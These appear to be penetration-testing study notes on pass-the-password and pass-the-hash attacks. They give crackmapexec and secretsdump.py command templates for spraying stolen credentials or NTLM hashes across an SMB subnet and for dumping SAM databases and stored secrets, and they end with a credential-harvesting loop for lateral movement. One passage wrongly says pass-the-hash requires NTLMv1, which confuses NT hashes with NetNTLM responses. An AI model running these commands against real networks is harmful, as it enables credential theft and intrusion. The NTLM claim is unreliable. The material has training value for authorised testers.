# Pass Attacks

**Crackmapexec** uses the account and password you have compromised and uses it to attempt authentication to the subnet targeted via SMB protocol. You can also do this with a hash.

```jsx
crackmapexec smb <subnet> -u USER -d DOMAIN -p PASSWORD

crackmapexec smb <subnet> -u USER -d DOMAIN -H HASH --local-auth
```

If using a pass the hash approach it has to be NTLMv1, NTLMv2 does not work with passing the hash. NTLMv2 can be used with relay.

```jsx
crackmapexec smb <subnet> -u USER -d DOMAIN -H HASH --local-auth --sam
```

Adding the - - sam will dump the sam on that device into the database

```jsx
cmedb
```

This command will get you into the Crackmapexec database 

[**Secretsdump.](http://Secretsdumps.py)py**  this script allows a dump of the SAM of that device as well as all of the “secrets” if you have access to a compromised account.

```jsx
secretsdump.py DOMAIN/Username:'PASSWORD'@IPAddress
```

You can use this tool to try and run this account against different machines you have Pwned1 and dump the secrets of different devices

```jsx
secretsdump.py username:@IPAddress -hashes HASH
```

Above is to use a hash instead of a password

Pass Attack Takeaways:

The concept of shell access gain into a network is not exactly the real life scenario. Moving laterally across the network with hashes and accounts you find are your best friend. Get a hash, attempt to crack, spray password or hash, find different account, repeat.